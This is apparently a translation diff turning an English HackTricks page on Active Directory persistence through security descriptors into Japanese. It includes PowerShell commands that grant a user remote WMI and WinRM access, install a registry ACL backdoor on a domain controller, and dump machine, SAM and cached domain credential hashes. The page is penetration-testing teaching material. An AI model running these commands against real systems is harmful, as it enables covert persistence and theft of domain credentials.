@@ -1,37 +1,32 @@
-# Security Descriptors
+# セキュリティ記述子
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Security Descriptors
+## セキュリティ記述子
 
-[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
+[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) は、セキュリティ記述子を記述するために使用されるフォーマットを定義します。SDDL は DACL と SACL のために ACE 文字列を使用します: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
 
-The **security descriptors** are used to **store** the **permissions** an **object** has **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.
+**セキュリティ記述子**は、**オブジェクト**が**オブジェクト**に対して**持つ** **権限**を**保存**するために使用されます。オブジェクトの**セキュリティ記述子**に**少しの変更**を加えることができれば、特権グループのメンバーである必要なく、そのオブジェクトに対して非常に興味深い権限を取得できます。
 
-Then, this persistence technique is based on the ability to win every privilege needed against certain objects, to be able to perform a task that usually requires admin privileges but without the need of being admin.
+この永続性技術は、特定のオブジェクトに対して必要なすべての権限を獲得する能力に基づいており、通常は管理者権限を必要とするタスクを、管理者である必要なく実行できるようにします。
 
-### Access to WMI
+### WMI へのアクセス
 
-You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
-
+ユーザーに**リモートで WMI を実行する**アクセスを与えることができます [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
 ```bash
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
 ```
+### WinRMへのアクセス
 
-### Access to WinRM
-
-Give access to **winrm PS console to a user** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
-
+**ユーザーにwinrm PSコンソールへのアクセスを与える** [**これを使用して**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
+### ハッシュへのリモートアクセス
 
-### Remote access to hashes
-
-Access the **registry** and **dump hashes** creating a **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** so you can at any moment retrieve the **hash of the computer**, the **SAM** and any **cached AD** credential in the computer. So, it's very useful to give this permission to a **regular user against a Domain Controller computer**:
-
+**レジストリ**にアクセスし、**ハッシュをダンプ**して**Regバックドアを作成する**ことで、いつでも**コンピュータのハッシュ**、**SAM**、およびコンピュータ内の任意の**キャッシュされたAD**資格情報を取得できます。したがって、これは**ドメインコントローラコンピュータに対して通常のユーザーにこの権限を与える**のに非常に便利です：
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -45,8 +40,6 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-
-Check [**Silver Tickets**](silver-ticket.md) to learn how you could use the hash of the computer account of a Domain Controller.
+[**シルバー チケット**](silver-ticket.md)を確認して、ドメイン コントローラーのコンピューター アカウントのハッシュをどのように使用できるかを学んでください。
 
 {{#include ../../banners/hacktricks-training.md}}
-
